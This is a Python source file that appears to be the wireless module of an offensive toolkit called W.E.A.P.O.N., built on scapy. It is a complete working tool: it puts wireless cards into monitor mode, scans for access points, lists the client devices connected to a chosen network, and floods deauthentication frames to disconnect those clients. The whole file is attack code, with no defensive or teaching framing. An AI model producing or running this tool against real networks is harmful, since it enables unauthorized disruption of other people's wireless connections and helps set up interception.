import subprocess
import argparse
import sys
import os
import time
import threading
from scapy.all import *

def list_interfaces():
    try:
        output = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
        print("[*] Available wireless interfaces:\n")
        for line in output.split('\n'):
            if "IEEE 802.11" in line:
                print("  -", line.split()[0])
    except Exception as e:
        print(f"[!] Failed to list interfaces: {e}")

def enable_monitor_mode(interface):
    print(f"[*] Enabling monitor mode on {interface}...")
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "monitor"], check=True)
        subprocess.run(["ip", "link", "set", interface, "up"], check=True)
        time.sleep(1)
        subprocess.run(["systemctl", "start", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[+] Monitor mode enabled on {interface}\n")
    except Exception as e:
        print(f"[!] Failed to enable monitor mode: {e}")
        sys.exit(1)

def disable_monitor_mode(interface):
    print(f"[*] Restoring managed mode on {interface}...")
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "managed"], check=True)
        subprocess.run(["ip", "link", "set", interface, "up"], check=True)
        subprocess.run(["systemctl", "start", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[+] Managed mode restored on {interface}\n")
    except Exception as e:
        print(f"[!] Failed to disable monitor mode: {e}")

def get_channel(pkt):
    if pkt.haslayer(Dot11Elt):
        elt = pkt[Dot11Elt]
        while isinstance(elt, Dot11Elt):
            if elt.ID == 3:  # Channel
                return ord(elt.info)
            elt = elt.payload
    return None

def channel_hopper(interface, stop_event):
    channels = list(range(1, 14))
    while not stop_event.is_set():
        for channel in channels:
            if stop_event.is_set():
                break
            subprocess.call(["iwconfig", interface, "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.5)

def scan_access_points(interface):
    enable_monitor_mode(interface)
    print(f"[*] Scanning for access points on {interface}...\n")
    seen = set()
    stop_event = threading.Event()
    hopper_thread = threading.Thread(target=channel_hopper, args=(interface, stop_event))
    hopper_thread.start()

    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            ssid = pkt[Dot11Elt].info.decode(errors='ignore')
            channel = get_channel(pkt)
            if bssid not in seen:
                print(f"[+] {ssid or '<Hidden>'} - {bssid} (CH: {channel})")
                seen.add(bssid)

    try:
        sniff(iface=interface, prn=packet_handler, timeout=15)
    finally:
        stop_event.set()
        hopper_thread.join()
        disable_monitor_mode(interface)

def find_clients(bssid, interface):
    enable_monitor_mode(interface)
    print(f"[*] Sniffing for clients connected to {bssid} on {interface}...\n")
    clients = set()

    def client_handler(pkt):
        if pkt.haslayer(Dot11):
            if pkt.type == 2:  # Data frame
                if pkt.addr1 and pkt.addr2:
                    if bssid in [pkt.addr1, pkt.addr2, pkt.addr3]:
                        client_mac = pkt.addr1 if pkt.addr1 != bssid else pkt.addr2
                        if client_mac and client_mac != "ff:ff:ff:ff:ff:ff" and client_mac not in clients:
                            print(f"[+] Client: {client_mac}")
                            clients.add(client_mac)

    try:
        sniff(iface=interface, prn=client_handler, timeout=15)
    finally:
        disable_monitor_mode(interface)

def deauth_attack(target_bssid, interface, client_mac=None, count=1000):
    enable_monitor_mode(interface)
    print(f"[*] Sending {count} deauth packets to {target_bssid} via {interface}...")
    if client_mac:
        print(f"[*] Targeting specific client {client_mac}")
    else:
        print("[*] Using broadcast mode (may be ignored by some clients)")

    addr1 = client_mac if client_mac else "ff:ff:ff:ff:ff:ff"
    dot11 = Dot11(addr1=addr1, addr2=target_bssid, addr3=target_bssid)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

    try:
        sendp(packet, iface=interface, count=count, inter=0.00002, verbose=1)
        print("[+] Deauthentication packets sent successfully.")
    except Exception as e:
        print(f"[!] Failed to send deauth packets: {e}")
    finally:
        disable_monitor_mode(interface)

def main():
    parser = argparse.ArgumentParser(description="Wireless module for W.E.A.P.O.N.")
    parser.add_argument("--list", action="store_true", help="          List wireless interfaces")
    parser.add_argument("--scan", metavar="iface", help="          Scan for nearby APs (channel hopping)")
    parser.add_argument("--deauth", nargs="+", help="          Send deauth packets: BSSID iface [client_mac]")
    parser.add_argument("--clients", nargs=2, metavar=('BSSID', 'iface'), help="          List connected clients to BSSID on iface")
    parser.add_argument("--count", type=int, default=1000, help="          Number of deauth packets to send (default: 1000)")

    args = parser.parse_args()

    if args.list:
        list_interfaces()
    elif args.scan:
        scan_access_points(args.scan)
    elif args.clients:
        bssid = args.clients[0]
        iface = args.clients[1]
        find_clients(bssid, iface)
    elif args.deauth:
        if len(args.deauth) < 2:
            print("[!] Usage: --deauth BSSID iface [client_mac]")
            sys.exit(1)
        bssid = args.deauth[0]
        iface = args.deauth[1]
        client = args.deauth[2] if len(args.deauth) >= 3 else None
        deauth_attack(bssid, iface, client, count=args.count)
    else:
        parser.print_help()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] This module must be run as root.")
        sys.exit(1)
    main()

